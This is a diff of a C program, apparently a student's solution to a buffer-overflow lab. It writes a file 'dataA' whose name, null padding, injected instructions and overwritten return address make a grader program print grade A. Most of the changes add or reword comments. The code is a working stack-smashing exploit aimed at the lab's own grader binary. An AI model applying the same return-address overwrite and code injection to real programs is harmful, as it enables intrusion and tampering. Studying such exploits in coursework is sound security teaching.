@@ -8,6 +8,13 @@
 #include <stdlib.h>
 #include "miniassembler.h"
 
+/*
+    Accepts no command-line arguments and doesn't read from stdin. 
+    Writes into file "dataA" the name, null bytes, assembly language
+    instructions, more null bytes, and the return address.
+    This results in grader.c printing the grade A for a
+    name in this file. Returns 0 for successful completion.
+*/
 int main(void) {
     FILE* psFile;
     unsigned long ret;
@@ -22,8 +29,7 @@ int main(void) {
 
     /* return address */
     ret = 0x420068;
-
-    /* 65 = A */
+    
     mov = MiniAssembler_mov(0, 'A');
 
     /* 0x420044 = address of grade in data
@@ -41,7 +47,7 @@ int main(void) {
     /* name from 0-11 */
     fprintf(psFile, "%s", name);
 
-    /* padding from 12-15 */
+    /* padding (null bytes) from 12-15 */
     for (i = 0; i < 4; i++)
         fprintf(psFile, "%c", '\0');
 
@@ -54,10 +60,11 @@ int main(void) {
     /* b printf from 28-31 */
     fwrite(&b, sizeof(unsigned int), 1, psFile);
 
-    /* padding from 32-47 */
+    /* padding (null bytes) from 32-47 */
     for (i = 0; i < 16; i++)
         fprintf(psFile, "%c", '\0');
     
+    /* return address */
     fwrite(&ret, sizeof(unsigned long), 1, psFile);
     return 0;
 }
